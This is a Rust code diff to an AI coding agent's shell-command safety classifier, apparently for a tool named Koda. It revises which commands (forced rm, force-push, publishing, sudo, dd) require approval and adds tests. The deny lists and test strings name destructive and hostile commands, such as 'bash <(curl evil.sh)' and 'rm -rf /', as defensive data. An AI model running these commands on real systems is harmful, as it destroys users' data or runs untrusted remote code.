@@ -18,7 +18,16 @@
 //! 2. **Write side-effect check** — quote-aware `>` / `>>` / `| tee` detection.
 //! 3. **Token-level check** — each pipeline segment is tokenised with
 //!    [`shlex::split`] (POSIX); tokens matched against `DANGER_CHECKS` (typed
-//!    enum, not flat substrings). Unparseable segments fail-open → LocalMutation.
+//!    enum, not flat substrings), looking inside wrappers (`env`, `nohup`,
+//!    `xargs`, …), `sh -c`, `eval` and `find -exec`. Unparseable segments
+//!    fail-open → LocalMutation.
+//!
+//! What is Destructive follows Codex (since 2026-11): a forced `rm` is the
+//! one local file operation that asks. Other changes inside the project run
+//! in the sandbox without asking in Auto: a plain `rm`, `chmod`, `sed -i`,
+//! `find -delete`, `kill`, an interpreter's `-c`. Koda adds what the sandbox
+//! can't contain or what loses work for good: git that discards work or
+//! rewrites a remote, publishing, GitHub changes, `sudo` and the machine.
 //!
 //! This replaces the old `strip_quoted_strings().contains(pat)` approach, which
 //! produced false positives when a dangerous-looking string appeared as a quoted
@@ -176,6 +185,11 @@ fn flag_matches(t: &str, flag: &str) -> bool {
     false
 }
 
+/// The arguments before `--`: after it, `-f` is a file name.
+fn options(args: &[String]) -> impl Iterator<Item = &String> {
+    args.iter().take_while(|t| *t != "--")
+}
+
 impl DangerCheck {
     fn matches(&self, tokens: &[String]) -> bool {
         use DangerCheck::*;
@@ -184,12 +198,12 @@ impl DangerCheck {
         };
         match *self {
             Cmd(c) => cmd == c,
-            CmdFlag(c, flag) => cmd == c && tokens[1..].iter().any(|t| flag_matches(t, flag)),
+            CmdFlag(c, flag) => cmd == c && options(&tokens[1..]).any(|t| flag_matches(t, flag)),
             CmdSub(c, sub) => cmd == c && tokens.get(1).map(|s| s.as_str()) == Some(sub),
             CmdSubFlag(c, sub, flag) => {
                 cmd == c
                     && tokens.get(1).map(|s| s.as_str()) == Some(sub)
-                    && tokens[2..].iter().any(|t| flag_matches(t, flag))
+                    && options(tokens.get(2..).unwrap_or_default()).any(|t| flag_matches(t, flag))
             }
             CmdSubSub(c, sub, sub2) => {
                 cmd == c
@@ -200,10 +214,16 @@ impl DangerCheck {
     }
 }
 
+/// What asks for approval even in Auto mode: what the sandbox can't contain
+/// or what loses work for good. As in Codex, a forced `rm` is the one local
+/// file operation here; everything else that only changes files in the
+/// project runs inside the sandbox without asking. Koda adds what Codex
+/// leaves out: git commands that throw away work or rewrite a remote
+/// (Koda has no undo), publishing, GitHub changes, and the machine itself.
 const DANGER_CHECKS: &[DangerCheck] = &[
-    // ── Destructive file operations ──────────────────────────────────────────
-    DangerCheck::Cmd("rm"),
-    DangerCheck::Cmd("rmdir"),
+    // ── Forced removal (Codex's one dangerous command) ───────────────────────
+    DangerCheck::CmdFlag("rm", "-f"), // also matches -rf, -fr, -Rf, …
+    DangerCheck::CmdFlag("rm", "--force"),
     // ── Privilege escalation ─────────────────────────────────────────────────
     DangerCheck::Cmd("sudo"),
     DangerCheck::Cmd("su"),
@@ -211,53 +231,14 @@ const DANGER_CHECKS: &[DangerCheck] = &[
     DangerCheck::Cmd("dd"),
     DangerCheck::Cmd("mkfs"),
     DangerCheck::Cmd("fdisk"),
-    // ── Permission / ownership changes ───────────────────────────────────────
-    DangerCheck::Cmd("chmod"),
-    DangerCheck::Cmd("chown"),
-    // ── Process control ──────────────────────────────────────────────────────
-    DangerCheck::Cmd("kill"),
-    DangerCheck::Cmd("killall"),
-    DangerCheck::Cmd("pkill"),
-    // ── Arbitrary code execution ─────────────────────────────────────────────
-    DangerCheck::Cmd("eval"),
     // ── System control ───────────────────────────────────────────────────────
     DangerCheck::Cmd("reboot"),
     DangerCheck::Cmd("shutdown"),
     DangerCheck::Cmd("halt"),
-    // ── In-place file edits ──────────────────────────────────────────────────
-    DangerCheck::CmdFlag("sed", "-i"),
-    DangerCheck::CmdFlag("sed", "--in-place"),
-    // ── Find with destructive flags (#970 sweep) ─────────────────────────────
-    // `find` itself is in READ_ONLY_PREFIXES (read-only by default), but
-    // these flags turn it into a deletion / arbitrary command-runner / file
-    // writer. They must force approval.
-    //   -delete           → deletes matched files
-    //   -exec, -execdir   → runs arbitrary command on matched files
-    //   -ok, -okdir       → like -exec but interactive (still risky to auto-approve)
-    //   -fprint, -fprintf → writes list of matches to a file (no `>` to catch)
-    //   -fls              → writes ls-style listing to a file
-    DangerCheck::CmdFlag("find", "-delete"),
-    DangerCheck::CmdFlag("find", "-exec"),
-    DangerCheck::CmdFlag("find", "-execdir"),
-    DangerCheck::CmdFlag("find", "-ok"),
-    DangerCheck::CmdFlag("find", "-okdir"),
-    DangerCheck::CmdFlag("find", "-fprint"),
-    DangerCheck::CmdFlag("find", "-fprintf"),
-    DangerCheck::CmdFlag("find", "-fls"),
-    // ── Interpreter inline execution (prompt-injection vector) ───────────────
-    DangerCheck::CmdFlag("python", "-c"),
-    DangerCheck::CmdFlag("python3", "-c"),
-    DangerCheck::CmdFlag("perl", "-e"),
-    DangerCheck::CmdFlag("ruby", "-e"),
-    DangerCheck::CmdFlag("node", "-e"),
-    // ── Nested shells (bypass classifier) ────────────────────────────────────
-    DangerCheck::CmdFlag("sh", "-c"),
-    DangerCheck::CmdFlag("bash", "-c"),
-    DangerCheck::CmdFlag("zsh", "-c"),
     // ── Package publishing ────────────────────────────────────────────────────
     DangerCheck::CmdSub("npm", "publish"),
     DangerCheck::CmdSub("cargo", "publish"),
-    // ── Destructive git ───────────────────────────────────────────────────────
+    // ── Git that loses work or rewrites a remote ─────────────────────────────
     DangerCheck::CmdSubFlag("git", "push", "-f"),
     DangerCheck::CmdSubFlag("git", "push", "--force"),
     DangerCheck::CmdSubFlag("git", "reset", "--hard"),
@@ -280,6 +261,157 @@ const DANGER_CHECKS: &[DangerCheck] = &[
     DangerCheck::CmdSubSub("gh", "auth", "setup-git"),
     DangerCheck::CmdSubSub("gh", "auth", "token"),
 ];
+
+/// Flags that make a read-only command change files. `sed` and `find` are in
+/// `READ_ONLY_PREFIXES`; with these they are a local change, which the
+/// sandbox contains (#970 sweep).
+///   -delete           → deletes matched files
+///   -exec, -execdir   → runs a command on matched files (classified below)
+///   -ok, -okdir       → like -exec, asking first
+///   -fprint, -fprintf → writes the list of matches to a file
+///   -fls              → writes an ls-style listing to a file
+const MUTATING_CHECKS: &[DangerCheck] = &[
+    DangerCheck::CmdFlag("sed", "-i"),
+    DangerCheck::CmdFlag("sed", "--in-place"),
+    DangerCheck::CmdFlag("find", "-delete"),
+    DangerCheck::CmdFlag("find", "-exec"),
+    DangerCheck::CmdFlag("find", "-execdir"),
+    DangerCheck::CmdFlag("find", "-ok"),
+    DangerCheck::CmdFlag("find", "-okdir"),
+    DangerCheck::CmdFlag("find", "-fprint"),
+    DangerCheck::CmdFlag("find", "-fprintf"),
+    DangerCheck::CmdFlag("find", "-fls"),
+];
+
+/// Commands that run the command after their own options, which is
+/// classified in their place: `env X=1 rm -f a` is a forced `rm`.
+/// Each entry lists the options that take a value.
+const WRAPPERS: &[(&str, &[&str])] = &[
+    ("env", &["-u", "-C", "-S"]),
+    // Shell keywords that start a segment: `if x; then rm -f a; fi`.
+    ("if", &[]),
+    ("then", &[]),
+    ("else", &[]),
+    ("elif", &[]),
+    ("do", &[]),
+    ("while", &[]),
+    ("until", &[]),
+    ("!", &[]),
+    ("nohup", &[]),
+    ("time", &[]),
+    ("command", &[]),
+    ("exec", &["-a"]),
+    ("nice", &["-n"]),
+    ("timeout", &["-s", "-k", "--signal", "--kill-after"]),
+    (
+        "xargs",
+        &[
+            "-I", "-i", "-n", "-P", "-L", "-l", "-s", "-d", "-E", "-e", "-a",
+        ],
+    ),
+];
+
+/// The command inside any wrappers: `env X=1 nohup rm -f a` → `rm -f a`.
+fn unwrap_wrappers(tokens: &[String]) -> &[String] {
+    let mut rest = tokens;
+    for _ in 0..8 {
+        let Some(first) = rest.first() else { break };
+        let Some((name, takes_value)) = WRAPPERS.iter().find(|(w, _)| w == first) else {
+            break;
+        };
+        let mut i = 1;
+        while let Some(t) = rest.get(i) {
+            if *name == "env" && t.contains('=') && !t.starts_with('-') {
+                i += 1;
+            } else if t == "--" {
+                i += 1;
+                break;
+            } else if t.starts_with('-') {
+                i += if takes_value.contains(&t.as_str()) {
+                    2
+                } else {
+                    1
+                };
+            } else {
+                break;
+            }
+        }
+        // `timeout 5 cmd`: the duration comes before the command.
+        if *name == "timeout" && rest.get(i).is_some() {
+            i += 1;
+        }
+        rest = &rest[i.min(rest.len())..];
+    }
+    rest
+}
+
+/// The script a shell runs with `-c`: `bash -lc 'rm -f a'` → `rm -f a`.
+fn shell_script(tokens: &[String]) -> Option<&str> {
+    let first = tokens.first()?;
+    if !["sh", "bash", "zsh", "dash", "ksh"].contains(&first.as_str()) {
+        return None;
+    }
+    let at = tokens[1..]
+        .iter()
+        .position(|t| t.starts_with('-') && !t.starts_with("--") && t[1..].contains('c'))?;
+    tokens.get(at + 2).map(String::as_str)
+}
+
+/// The commands `find` runs: each `-exec … ;` (or `+`), `-execdir`, `-ok`,
+/// `-okdir`.
+fn find_exec_commands(tokens: &[String]) -> Vec<&[String]> {
+    if tokens.first().map(String::as_str) != Some("find") {
+        return Vec::new();
+    }
+    let mut out = Vec::new();
+    let mut i = 1;
+    while i < tokens.len() {
+        if ["-exec", "-execdir", "-ok", "-okdir"].contains(&tokens[i].as_str()) {
+            let start = i + 1;
+            let end = tokens[start..]
+                .iter()
+                .position(|t| t == ";" || t == "+")
+                .map_or(tokens.len(), |p| start + p);
+            out.push(&tokens[start..end]);
+            i = end;
+        }
+        i += 1;
+    }
+    out
+}
+
+/// A segment's effect by what it runs, or `None` for the read-only list to
+/// decide. Looks inside wrappers, `sh -c`, `eval` and `find -exec`, so a
+/// forced `rm` asks wherever it is.
+fn effect_of_tokens(tokens: &[String]) -> Option<ToolEffect> {
+    let inner = unwrap_wrappers(tokens);
+    if DANGER_CHECKS
+        .iter()
+        .any(|c| c.matches(tokens) || c.matches(inner))
+    {
+        return Some(ToolEffect::Destructive);
+    }
+    let script = match inner.first().map(String::as_str) {
+        Some("eval") => Some(inner[1..].join(" ")),
+        _ => shell_script(inner).map(str::to_string),
+    };
+    if let Some(script) = script {
+        return Some(match classify_bash_command(&script) {
+            ToolEffect::Destructive => ToolEffect::Destructive,
+            _ => ToolEffect::LocalMutation,
+        });
+    }
+    if find_exec_commands(inner)
+        .into_iter()
+        .any(|cmd| effect_of_tokens(cmd) == Some(ToolEffect::Destructive))
+    {
+        return Some(ToolEffect::Destructive);
+    }
+    MUTATING_CHECKS
+        .iter()
+        .any(|c| c.matches(inner))
+        .then_some(ToolEffect::LocalMutation)
+}
 
 // ── Raw structural patterns ───────────────────────────────────────────────────
 
@@ -405,8 +537,8 @@ const SUBSTITUTION: &str = "__koda_substitution__";
 /// (`bash <(curl …)`, `source <(…)`, `sh -c "$(…)"`), which the classifier
 /// can't see. `eval` is destructive on its own.
 const RUNS_ITS_INPUT: &[&str] = &[
-    "sh", "bash", "zsh", "dash", "ksh", "fish", "source", ".", "exec", "python", "python3", "perl",
-    "ruby", "node", "deno", "bun", "xargs",
+    "sh", "bash", "zsh", "dash", "ksh", "fish", "source", ".", "exec", "eval", "python", "python3",
+    "perl", "ruby", "node", "deno", "bun", "xargs",
 ];
 
 /// Take the substitutions out of `command`: `$(…)` (and `$((…))`), backticks,
@@ -661,12 +793,15 @@ fn classify_segment(segment: &str) -> ToolEffect {
     // (#972). E.g. `(rm -rf /)` should classify the same as `rm -rf /`.
     // Conservative: only strips outermost layer; nested cases like `((rm))`
     // still work because the leading `(` chars are all stripped together.
-    let seg = seg
-        .trim()
-        .trim_start_matches(['(', '{'])
-        .trim_end_matches([')', '}', ';'])
-        .trim()
-        .to_string();
+    let mut seg = seg.trim().trim_start_matches(['(', '{']).trim();
+    // An escaped `\;` ends `find -exec`; only a bare one closes a group.
+    while let Some(rest) = seg.strip_suffix([')', '}', ';']) {
+        if rest.ends_with('\\') {
+            break;
+        }
+        seg = rest.trim_end();
+    }
+    let seg = seg.to_string();
 
     if seg.is_empty() {
         return ToolEffect::ReadOnly;
@@ -679,11 +814,9 @@ fn classify_segment(segment: &str) -> ToolEffect {
         _ => return ToolEffect::LocalMutation,
     };
 
-    // Check against structured danger patterns.
-    for check in DANGER_CHECKS {
-        if check.matches(&tokens) {
-            return ToolEffect::Destructive;
-        }
+    // What it runs, inside wrappers, shells and `find -exec`.
+    if let Some(effect) = effect_of_tokens(&tokens) {
+        return effect;
     }
 
     // Fall back to read-only allowlist.
@@ -1567,72 +1700,129 @@ mod tests {
         );
     }
 
-    // find with destructive flags (#970 sweep finding)
+    // find with file-changing flags (#970 sweep finding)
 
-    /// `find -delete` deletes files. Must force approval even though `find`
-    /// itself is in READ_ONLY_PREFIXES.
+    /// `find` with a flag that deletes, writes or runs a command changes
+    /// files: a local change, not read-only, though `find` itself is in
+    /// READ_ONLY_PREFIXES. The sandbox contains it, so it doesn't ask in Auto.
     #[test]
-    fn test_classify_find_delete_is_destructive() {
+    fn test_classify_find_changing_flags_are_local_mutations() {
         for cmd in [
             "find . -name '*.tmp' -delete",
-            "find /tmp -delete",
             "find . -type f -delete",
-        ] {
-            assert_eq!(
-                classify_bash_command(cmd),
-                ToolEffect::Destructive,
-                "`{cmd}` must be Destructive (deletes files)",
-            );
-        }
-    }
-
-    /// `find -exec <cmd>` runs arbitrary commands. Must force approval.
-    #[test]
-    fn test_classify_find_exec_is_destructive() {
-        for cmd in [
             "find . -name '*.tmp' -exec rm {} ;",
             "find . -exec touch {} ;",
             "find . -execdir rm {} +",
             "find /var/log -exec gzip {} ;",
-        ] {
-            assert_eq!(
-                classify_bash_command(cmd),
-                ToolEffect::Destructive,
-                "`{cmd}` must be Destructive (runs inner command)",
-            );
-        }
-    }
-
-    /// `find -fprint`, `-fprintf`, `-fls` write match results to a file. Must
-    /// force approval since they bypass Phase 2 (no `>` redirect).
-    #[test]
-    fn test_classify_find_file_writing_flags_destructive() {
-        for cmd in [
             "find . -fprint /tmp/out",
             "find / -fprintf /tmp/out '%p\\n'",
             "find . -fls /tmp/out",
-        ] {
-            assert_eq!(
-                classify_bash_command(cmd),
-                ToolEffect::Destructive,
-                "`{cmd}` must be Destructive (writes to file via flag)",
-            );
-        }
-    }
-
-    /// `find -ok` / `-okdir` are the interactive variants of -exec/-execdir.
-    /// Must force approval to avoid the model running them in non-interactive
-    /// contexts where they'd hang.
-    #[test]
-    fn test_classify_find_interactive_exec_flags_destructive() {
-        for cmd in [
             "find . -name '*.tmp' -ok rm {} ;",
             "find . -okdir mv {} /tmp ;",
         ] {
             assert_eq!(
                 classify_bash_command(cmd),
+                ToolEffect::LocalMutation,
+                "`{cmd}` changes files",
+            );
+        }
+    }
+
+    /// The command `find -exec` runs is classified: a forced `rm` there asks.
+    #[test]
+    fn test_classify_find_exec_runs_a_forced_rm() {
+        for cmd in [
+            "find . -name '*.tmp' -exec rm -f {} ;",
+            "find . -execdir rm -rf {} +",
+            // An escaped `\;` used to stop the classifier from reading it.
+            "find . -name '*.log' -exec rm -f {} \\;",
+            "find . -exec ls {} \\; -exec rm -f {} \\;",
+        ] {
+            assert_eq!(
+                classify_bash_command(cmd),
                 ToolEffect::Destructive,
-                "`{cmd}` must be Destructive",
+                "`{cmd}` runs a forced rm",
+            );
+        }
+    }
+
+    /// As in Codex, only a forced `rm` asks; a plain one is a local change
+    /// the sandbox contains. So are the other commands that used to ask for
+    /// any local change.
+    #[test]
+    fn test_classify_only_a_forced_rm_asks() {
+        for cmd in [
+            "rm -f a",
+            "rm -rf build",
+            "rm -fr build",
+            "rm -Rf build",
+            "rm -r -f build",
+            "rm --force a",
+            "rm a -f",
+            "env TARGET=x rm -rf build",
+            "nohup rm -f a",
+            "time rm -f a",
+            "timeout 5 rm -f a",
+            "nice -n 5 rm -f a",
+            "xargs -I {} rm -f {}",
+            "find . -name '*.o' | xargs rm -f",
+            "bash -c 'rm -rf build'",
+            "sh -lc \"cd x && rm -f a\"",
+            "eval rm -rf build",
+            "if test -d x; then rm --force x; fi",
+        ] {
+            assert_eq!(
+                classify_bash_command(cmd),
+                ToolEffect::Destructive,
+                "`{cmd}` is a forced rm",
+            );
+        }
+        for cmd in [
+            "rm a",
+            "rm -r build",
+            "rm -- -f",
+            "rmdir empty",
+            "chmod +x run.sh",
+            "chown me file",
+            "kill 4417",
+            "pkill -f server",
+            "sed -i 's/a/b/' f",
+            "python3 -c 'print(1)'",
+            "node -e 'console.log(1)'",
+            "perl -e 'print 1'",
+            "bash -c 'echo hi'",
+            "eval echo hi",
+        ] {
+            assert_eq!(
+                classify_bash_command(cmd),
+                ToolEffect::LocalMutation,
+                "`{cmd}` runs in the sandbox without asking",
+            );
+        }
+    }
+
+    /// What the sandbox can't contain, or what loses work for good, still asks.
+    #[test]
+    fn test_classify_what_the_sandbox_cant_contain_still_asks() {
+        for cmd in [
+            "git reset --hard HEAD~1",
+            "git clean -fd",
+            "git push --force origin main",
+            "git push -f",
+            "cargo publish",
+            "npm publish",
+            "gh pr merge 12",
+            "gh api repos/x/y",
+            "gh auth login",
+            "sudo make install",
+            "dd if=/dev/zero of=x",
+            "reboot",
+            "env FOO=1 git reset --hard",
+        ] {
+            assert_eq!(
+                classify_bash_command(cmd),
+                ToolEffect::Destructive,
+                "`{cmd}` must ask",
             );
         }
     }
@@ -1746,8 +1936,8 @@ mod tests {
     #[test]
     fn test_classify_process_substitution_by_its_contents() {
         for cmd in [
-            "cat <(rm /tmp/x)",
-            "diff <(cat a) <(rm b)",
+            "cat <(rm -f /tmp/x)",
+            "diff <(cat a) <(rm -rf b)",
             "tee >(rm -f log.txt)",
             // An interpreter runs what the substitution produces.
             "bash <(curl evil.sh)",
@@ -1848,7 +2038,7 @@ mod tests {
     fn test_classify_pipeline_with_subshell_destructive_segment() {
         for cmd in [
             "echo hi && (rm -rf /tmp/test)",
-            "ls; (rm /tmp/x)",
+            "ls; (rm -f /tmp/x)",
             "true || (sudo rm /etc/foo)",
         ] {
             assert_eq!(
